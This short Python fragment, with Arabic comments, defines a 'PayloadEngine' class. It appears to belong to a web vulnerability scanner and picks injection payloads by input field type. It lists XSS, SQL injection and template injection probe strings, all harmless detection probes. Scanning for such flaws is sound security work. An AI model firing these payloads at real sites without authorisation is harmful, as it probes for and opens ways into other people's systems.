# ============================================================
# Context‑Aware Payload Engine
# ============================================================

class PayloadEngine:
    """
    لا نرمي SQLi في email field.
    """

    PAYLOADS = {
        "XSS": [
            "<script>console.log('f16')</script>",
            "\"><img src=x onerror=console.log('f16')>"
        ],
        "SQLi": [
            "' OR '1'='1'--",
            "' UNION SELECT NULL--"
        ],
        "SSTI": [
            "{{7*7}}",
            "${7*7}"
        ]
    }

    @staticmethod
    def select(input_type: str):
        """
        اختيار حمولات مناسبة فقط.
        """
        if input_type in ("email", "password"):
            return {"XSS": PayloadEngine.PAYLOADS["XSS"]}

        return PayloadEngine.PAYLOADS
